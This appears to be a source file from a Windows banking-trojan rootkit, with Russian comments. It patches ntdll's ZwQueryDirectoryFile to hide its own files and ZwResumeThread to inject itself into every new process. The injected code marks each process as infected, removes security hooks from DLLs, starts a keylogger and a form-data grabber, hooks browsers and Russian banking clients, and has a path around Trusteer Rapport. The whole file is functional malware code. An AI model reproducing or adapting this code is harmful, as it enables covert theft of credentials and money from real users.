#include <windows.h>
#include <tlhelp32.h>

#include "GetApi.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Splice.h"
#include "Inject.h"
#include "Rootkit.h"
#include "Unhook.h"
#include "Trade.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "BotCore.h"
#include "PostDataGrabber.h"

#include "Modules.h"


//---------------------------------------------------------------------------

#include "BotDebug.h"

namespace ROOTKITDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define RTKDBG ROOTKITDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------

DWORD dwAddrDirProc = 0; // ZwQueryDirectoryFile hook
DWORD dwAddrRthProc = 0; // ZwResumeThread hook
DWORD dwAddrOpfProc = 0; // ZwOpenFile hook
DWORD dwAddrCrfProc = 0; // ZwCreateFile hook


typedef NTSTATUS ( WINAPI *PZwQueryDirectoryFile )( HANDLE  FileHandle, HANDLE  Event,
							   PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext,
							   PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation,
							   ULONG  Length, FILE_INFORMATION_CLASS  FileInformationClass,
							   BOOLEAN  ReturnSingleEntry, PUNICODE_STRING  FileName,
							   BOOLEAN  RestartScan  );


PZwQueryDirectoryFile ZwQueryDirectoryFileReal;



//-----------------------------------------------------------------------------

NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
										   PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext,
										   PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation,
										   ULONG  Length, FILE_INFORMATION_CLASS  FileInformationClass,
										   BOOLEAN  ReturnSingleEntry, PUNICODE_STRING  FileName,
										   BOOLEAN  RestartScan  )
{
	PFILE_DIRECTORY_INFORMATION LastFileDirectoryInfo = 0;
	PFILE_DIRECTORY_INFORMATION FileDirectoryInfo = 0;

	PFILE_FULL_DIR_INFORMATION LastFileFullDirectoryInfo = 0;
	PFILE_FULL_DIR_INFORMATION FileFullDirectoryInfo = 0;

	PFILE_BOTH_DIR_INFORMATION LastFileBothDirectoryInfo = 0;
	PFILE_BOTH_DIR_INFORMATION FileBothDirectoryInfo = 0;

	PFILE_NAME_INFORMATION LastFileNamesInfo = 0;
	PFILE_NAME_INFORMATION FileNamesInfo = 0;
	
	PFILE_ID_BOTH_DIR_INFORMATION LastFileIdBothDirInfo = 0;
	PFILE_ID_BOTH_DIR_INFORMATION FileIdBothDirInfo = 0;

	NTSTATUS Status = ZwQueryDirectoryFileReal( FileHandle, Event, ApcRoutine, ApcContext,
												IoStatusBlock, FileInformation, Length,
												FileInformationClass, ReturnSingleEntry,
												FileName, RestartScan );
	
	if ( Status != STATUS_SUCCESS )
		return Status;


	DWORD dwOffset = 0;
	DWORD dwPr	   = 0;

	
	switch ( FileInformationClass )
	{
		case FileDirectoryInformation:
			
			FileDirectoryInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileDirectoryInfo = FileDirectoryInfo;
				}

				FileDirectoryInfo = (PFILE_DIRECTORY_INFORMATION)( (DWORD)FileInformation + dwOffset );
				

				if ( IsHideFile( FileDirectoryInfo->FileName, FileDirectoryInfo->FileNameLength, 1 ) )
				{
					if ( !FileDirectoryInfo->NextEntryOffset )
					{
						if ( LastFileDirectoryInfo != NULL )
						{
							LastFileDirectoryInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileDirectoryInfo != NULL )
					{
						LastFileDirectoryInfo->NextEntryOffset += FileDirectoryInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileDirectoryInfo->NextEntryOffset;
			}
			while ( FileDirectoryInfo->NextEntryOffset != 0 );
		break;

		case FileFullDirectoryInformation:

			FileFullDirectoryInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileFullDirectoryInfo = FileFullDirectoryInfo;
				}

				FileFullDirectoryInfo = (PFILE_FULL_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );
				

				if ( IsHideFile( FileFullDirectoryInfo->FileName, FileFullDirectoryInfo->FileNameLength, 2 ) )
				{
					if ( !FileFullDirectoryInfo->NextEntryOffset )
					{
						if ( LastFileFullDirectoryInfo != NULL )
						{
							LastFileFullDirectoryInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileFullDirectoryInfo != NULL )
					{
						LastFileFullDirectoryInfo->NextEntryOffset += FileFullDirectoryInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileFullDirectoryInfo->NextEntryOffset;
			}
			while ( FileFullDirectoryInfo->NextEntryOffset != 0 );
		break;

		//-------------------------------------------------
		case FileBothDirectoryInformation:

			FileBothDirectoryInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileBothDirectoryInfo = FileBothDirectoryInfo;
				}

				FileBothDirectoryInfo = (PFILE_BOTH_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );


				if ( IsHideFile( FileBothDirectoryInfo->FileName, FileBothDirectoryInfo->FileNameLength, 3) )
				{

					FileBothDirectoryInfo->FileAttributes = FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN;

					if ( !FileBothDirectoryInfo->NextEntryOffset )
					{
						if ( LastFileBothDirectoryInfo != NULL )
						{
							LastFileBothDirectoryInfo->NextEntryOffset = 0;
						}
						else
						{
//							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileBothDirectoryInfo != NULL )
					{
						LastFileBothDirectoryInfo->NextEntryOffset += FileBothDirectoryInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileBothDirectoryInfo->NextEntryOffset;
			}
			while ( FileBothDirectoryInfo->NextEntryOffset != 0 );

		break;
		//-------------------------------------------------




		case FileNamesInformation:

			FileNamesInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileNamesInfo = FileNamesInfo;
				}

				FileNamesInfo = (PFILE_NAME_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileNamesInfo->FileName, FileNamesInfo->FileNameLength, 4 ) )
				{
					if ( !FileNamesInfo->NextEntryOffset )
					{
						if ( LastFileNamesInfo != NULL )
						{
							LastFileNamesInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileNamesInfo != NULL )
					{
						LastFileNamesInfo->NextEntryOffset += FileNamesInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileNamesInfo->NextEntryOffset;
			}
			while ( FileNamesInfo->NextEntryOffset != 0 );
		break;

		case FileIdBothDirectoryInformation:
			
			FileIdBothDirInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileIdBothDirInfo = FileIdBothDirInfo ;
				}

				FileIdBothDirInfo  = (PFILE_ID_BOTH_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileIdBothDirInfo->FileName, FileIdBothDirInfo->FileNameLength, 5 ) )
				{
					if ( !FileIdBothDirInfo->NextEntryOffset )
					{
						if ( LastFileIdBothDirInfo  != NULL )
						{
							LastFileIdBothDirInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileIdBothDirInfo  != NULL )
					{
						LastFileIdBothDirInfo->NextEntryOffset += FileIdBothDirInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileIdBothDirInfo->NextEntryOffset;
			}
			while ( FileIdBothDirInfo->NextEntryOffset != 0 );
		break;

		default:
		break;
	}

	return Status;

}

__declspec( naked ) void JmpToHookDirProc()
{
	__asm
	{
		pop eax
		lea eax,ZwQueryDirectoryFileHook
		jmp eax
		retn
	}
}

BOOL ProtectPage( LPVOID lpAddr, DWORD dwParams )
{
	DWORD dwOldProt = 0;
	return (BOOL)pVirtualProtectEx( (HANDLE)-1, lpAddr, 1024, dwParams, &dwOldProt );
}

void HookZwQueryDirectoryFile()
{
	dwAddrDirProc = (DWORD)&JmpToHookDirProc;
	DWORD dwAddr  = (DWORD)&dwAddrDirProc;

	PZwQueryDirectoryFile ZwQueryDirectoryFile = (PZwQueryDirectoryFile)GetProcAddressEx( NULL, 5, 0x5F8B35D6 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwQueryDirectoryFile;

	if ( lpPtr == NULL )
	{
		return;
	}

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwQueryDirectoryFileReal =  (PZwQueryDirectoryFile)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwQueryDirectoryFileHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );
		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwQueryDirectoryFile, PAGE_EXECUTE_READ );

	return;
}

typedef NTSTATUS ( WINAPI *PZwResumeThread )( HANDLE hThread, PULONG PreviousSuspendCount );
PZwResumeThread ZwResumeThreadReal;


DWORD GetPidByThread(HANDLE hThread )
{
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if ( pZwQueryInformationThread( hThread, ThreadBasicInformation, &Threads, sizeof( THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
		return (DWORD)Threads.ClientId.UniqueProcess;

	return -1;
}





void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
{


	#ifdef _DEBUG_SOCKET_H_
		 StartDebugSocket(); 
	#endif


	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	//инициализируем систему оповещения о пост данных, должен быть запущен раньше кейлогера
	//т. к. в кейлогере есть системы которым нужен инициализированный модуль PostDataGrabber
	#ifdef PostDataGrabberH
		PostDataGrabber::Init();
	#endif

	#ifdef KeyLogSystemsH
		StartKeyLogger(Data->Application);
	#endif

	#ifdef SBERH
		Sber::Init( Data->Application, AppHash);
	#endif

	#ifdef CyberPlatDLLH
		if (CyberPlatCheckApplication(Data->Application)) return;
	#endif

	#ifdef CyberPlatH
		if( IsCyber2Process() )
		{
			HookCyberplat();
		}
	#endif

	#ifdef FinamH
		Finam::Init();
	#endif

	#ifdef OperaH
		if (HookOpera()) return;
	#endif


    #ifdef InternetExplorerH
		if ( HookInternetExplorer() )
		{
			InternetExplorerStarted(Data);
			BrowserStarted(Data);
			return;
		}
	#endif

	#ifdef FireFoxH
		if ( HookMozillaFirefox() )
		{
			FireFoxStarted(Data);
			BrowserStarted(Data);
			return;
		}
    #endif

	#ifdef ChromeH  
		if (InitialzeChrome(AppHash))
		{  
			BrowserStarted(Data);
			return;
		}

	#endif

	//  подгрузка длл которая позволяет удаленно следить за рабочим столом
	#ifdef PokerH
		if (IsPoker()) 	return;
	#endif

	//  хук что ставиться при запуске Ibank Cyberplat как в ехе варианте так и веб
	#ifdef RuBnkH //
	   	if (IbankHooksMain())  return;
	#endif


	#ifdef FtpSnifferH
		FtpSniffer();
	#endif

	//Хуки на обработку командной строки
	#ifdef CmdLineH
		if ( AppHash == 0x150CFBD3 /* java.exe */ || AppHash == 0x1F1AA76A /* javaw.exe */ )
		{
			HookCmdLine();
		}
	#endif

}



//------------------------------------------------------
//  StartStopProcessThreads
//
//  Функция останавливает/запускает все потоки процесса
//  кроме того из ко торого произошёл вызов функции
//------------------------------------------------------
bool StartStopProcessThreads(bool Stop)
{
	// Получам симок работающих процессов
	DWORD PID    = Bot->PID();
	DWORD Thread = (DWORD)pGetCurrentThreadId();

	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if(Snap == INVALID_HANDLE_VALUE) return false;

	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32 );

	if (pThread32First(Snap, &te))
    {
		do
		{
			if(te.th32ThreadID != Thread && te.th32OwnerProcessID == PID)
			{
				HANDLE Handle = (HANDLE)pOpenThread(THREAD_SUSPEND_RESUME, false, te.th32ThreadID);
				if (Handle)
				{
					if (Stop)
						pSuspendThread(Handle);
					else
						pResumeThread(Handle);
					pCloseHandle(Handle);
                }
			}
		}
		while(pThread32Next(Snap, &te));
	}
	pCloseHandle(Snap);
	return true;
}




DWORD WINAPI RootkitThread(LPVOID)
{
	BOT::Initialize(ProcessUnknown);

	// Помечаем процесс как инфицированный
    BOT::MarkAsInfcted();

	// Приостанавливаем всепотоки
   //	StartStopProcessThreads(true);


	// Подготавливаем данные для события
	TEventData Data;
	ClearStruct(Data); 

	// Определяем имя приложения
	string AppName(MAX_PATH);
	pGetModuleFileNameA(NULL, AppName.t_str(), MAX_PATH);
	AppName.CalcLength();

	Data.Application = AppName.t_str();
	DWORD hashApp = File::GetNameHashA((PCHAR)AppName.t_str(), true);
	RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str() );

    // Поток работает в заинжекченном процессе
	// Дл всех приложений, кроме хрома снимаем хуки.
	// Хрм сам ставит хуки, по этому, если их снть
	// нарушается ег работспосбность.
	
	if (hashApp != 0xBD3CC33A /* chrome.exe */)
		UnhookDlls();



	HookZwResumeThread();	
	HookZwQueryDirectoryFile();


	RootkitDoStartApplication(&Data, hashApp); 

	ApplicationStarted(&Data);

	// Стартуем потоки
	//StartStopProcessThreads(false);

	return 0;
}


LPDWORD dwHashPid;
DWORD dwPidCount;

void AddPid( DWORD dwPid )
{
	if ( dwHashPid == NULL )
	{
		if ( ( dwHashPid = (LPDWORD)MemAlloc( sizeof( LPDWORD ) ) ) == NULL )
		{
			return;
		}
	}
	else
	{
		LPDWORD p = (LPDWORD)MemRealloc( dwHashPid, GetMemSize( dwHashPid ) + ( sizeof( LPDWORD ) * ( dwPidCount + 1 ) ) );

		if ( p == NULL )
		{
			return;
		}

		dwHashPid = p;
	}

	dwHashPid[ dwPidCount ] = dwPid;
	dwPidCount++;

	return;
}

bool FindPid( DWORD dwPid )
{
	for ( DWORD i = 0; i < dwPidCount; i++ )
	{
		if ( dwHashPid[i] == dwPid )
		{
			return true;
		}
	}

	return false;
}


#ifdef _ANTIRAPPORT__INJECT__
//для фф и ие при включенном антирапорте позволяет заюзать 4 инжект
// (создает отдельный поток в процессе куда инжектимся)


NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
{

	NTSTATUS nt;
	DWORD dwPid = GetPidByThread( hThread );
	DWORD ProcessHash = GetProcessHashOfId(dwPid);
	BOOL IsAntiRapport = IsRunAntiRapport() & ( (ProcessHash == 0x7712feae) | (ProcessHash == 0x250DFA8F) ); //  0x7712feae / 0x250DFA8F 	-	ХЕШ  фф / ИЕ

	if (IsAntiRapport){
		nt = ZwResumeThreadReal( hThread, PreviousSuspendCount );
	}
	if ( dwPid != -1 && dwPid != (DWORD)pGetCurrentProcessId() )
	{
		if ( !FindPid( dwPid ) )
		{
			OBJECT_ATTRIBUTES ObjectAttributes =	{ sizeof( ObjectAttributes ) } ;
			CLIENT_ID ClientID;

			ClientID.UniqueProcess = (HANDLE)dwPid;
			ClientID.UniqueThread  = 0;

			HANDLE hProcess = NULL;
		
			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
			{

				DWORD dwAddr;

				if( pGetProcessId(hProcess) != pGetCurrentProcessId())
				{
					if (IsAntiRapport){
							AddPid( dwPid );
							dwAddr = InjectCode4( hProcess, RootkitThread );
					}else
					{
						dwAddr = InjectCode( hProcess, RootkitThread );

						if ( dwAddr != -1 )
						{
							if ( (NTSTATUS)pZwQueueApcThread( hThread, (LPTHREAD_START_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS ) 
								AddPid( dwPid );
						}
						AddPid( dwPid );
					};
				};

				pZwClose( hProcess );
			}

		}

	}

	return (IsAntiRapport)? nt : ZwResumeThreadReal( hThread, PreviousSuspendCount ) ; 
}

#else


NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
{
	//CHAR buf[128];
	DWORD dwPid = GetPidByThread( hThread );

	if ( dwPid != -1 && dwPid != (DWORD)pGetCurrentProcessId() )
	{
		if ( !FindPid( dwPid ) )
		{
			OBJECT_ATTRIBUTES ObjectAttributes =	{ sizeof( ObjectAttributes ) } ;
			CLIENT_ID ClientID;

			ClientID.UniqueProcess = (HANDLE)dwPid;
			ClientID.UniqueThread  = 0;

			HANDLE hProcess = NULL;
		
			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
			{

				DWORD dwAddr = -1;
				if( pGetProcessId(hProcess) != pGetCurrentProcessId())
						dwAddr = InjectCode( hProcess, (LPTHREAD_START_ROUTINE)RootkitThread );

				if ( dwAddr != -1 )
				{
				   if ( (NTSTATUS)pZwQueueApcThread( hThread, (PKNORMAL_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS ) 
					{
						AddPid( dwPid );
					}
				}
				pZwClose( hProcess );
			}

		}

	}

	return ZwResumeThreadReal( hThread, PreviousSuspendCount ); 
}

#endif
/*
NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
{
	DWORD dwPid = GetPidByThread( hThread );

	if ( dwPid != -1 && dwPid != (DWORD)pGetCurrentProcessId() )
	{
		if ( !FindPid( dwPid ) )
		{
			OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
			CLIENT_ID ClientID;

			ClientID.UniqueProcess = (HANDLE)dwPid;
			ClientID.UniqueThread  = 0;

			HANDLE hProcess = NULL;
			
			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
			{
				DWORD dwAddr = InjectCode( hProcess, RootkitThread );

				if ( dwAddr != -1 )
				{
					if ( (NTSTATUS)pZwQueueApcThread(hThread, (LPTHREAD_START_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS )
						AddPid( dwPid );
				}

				pZwClose( hProcess );
			}		
		}
	}

	return ZwResumeThreadReal( hThread, PreviousSuspendCount );
}*/

__declspec( naked ) void JmpToHookRthProc()
{
	__asm
	{
		pop eax
		lea eax,ZwResumeThreadHook
		jmp eax
		retn
	}
}


void HookZwResumeThread()
{
	dwHashPid  = NULL;
	dwPidCount = 0;
	
	dwAddrRthProc = (DWORD)JmpToHookRthProc;
	DWORD dwAddr  = (DWORD)&dwAddrRthProc;

	PZwResumeThread ZwResumeThread = (PZwResumeThread)GetProcAddressEx( NULL, 5, 0xACF8BF39 );

	LPVOID lpMem;	
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwResumeThread;

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );
	

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwResumeThreadReal =  (PZwResumeThread)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwResumeThreadHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &ZwResumeThreadHook, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );

		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwResumeThread, PAGE_EXECUTE_READ );
}







